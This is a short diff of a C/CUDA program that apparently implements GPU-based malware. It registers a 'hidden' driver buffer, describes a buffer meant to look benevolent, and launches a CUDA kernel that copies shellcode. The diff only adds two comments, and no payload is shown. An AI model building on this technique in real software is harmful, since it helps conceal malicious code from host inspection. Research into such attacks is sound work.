@@ -212,6 +212,7 @@ int main(void) {
 		printf("NAH");
 	}
 	/* register the info buffer. First things first... */
+	// info_for_cuda_driver-> starting address for Stub funct
 	CUDA_CHECK_RETURN(cudaHostRegister((void *)info_for_cuda_driver, sizeof(hidden_driver_info), CU_MEMHOSTREGISTER_PORTABLE)) ;
 	/* Map what a Nice guy would think is a benevelent buffer.
 	Note : Data is copied from user space hidden buffer. It can be changed afterwards. Will not effect Driver!*/
@@ -228,6 +229,7 @@ int main(void) {
 	//(stdout->_IO_write_base)[1]='W';
 
 	/*Activate cuda kernel, that copies shellcode */
+	// real_buff is only a malloced buffer?
 	PixsysCuda<<<1,64>>>(d_real_buff,offset);
 
 
